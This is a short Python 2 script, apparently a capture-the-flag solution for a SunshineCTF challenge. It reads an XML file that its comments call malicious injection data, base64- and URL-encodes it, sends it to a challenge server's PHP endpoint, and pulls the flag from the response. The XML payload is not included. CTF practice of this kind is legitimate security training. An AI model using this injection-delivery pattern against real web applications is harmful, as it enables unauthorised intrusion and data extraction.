import requests
import base64
import urllib
import re

with open("payload.xml") as file:
	data = file.read()

payload = data #Mallicious injection data
payload = base64.b64encode(payload)
#The PHP code sees our request as base64 and will decode it
#so i assigned the payload as base64
newpayload = {'input' : payload} #get request parameter
newpayload = urllib.urlencode(newpayload)
#The PHP code sees the request as urlencoded too
#So i encoded it  as url and the PHP code will decode it to plaintext
print "Sending payload: " + newpayload

r = requests.get("http://ng.sunshinectf.org/generate.php", params = newpayload)
#POST request using "data=", get requests using "params="

flag = re.findall(r'sun{(.*)}', r.text)[0]
#regular expression to find something inside sunctf{..}
print "sun{%s}" % flag
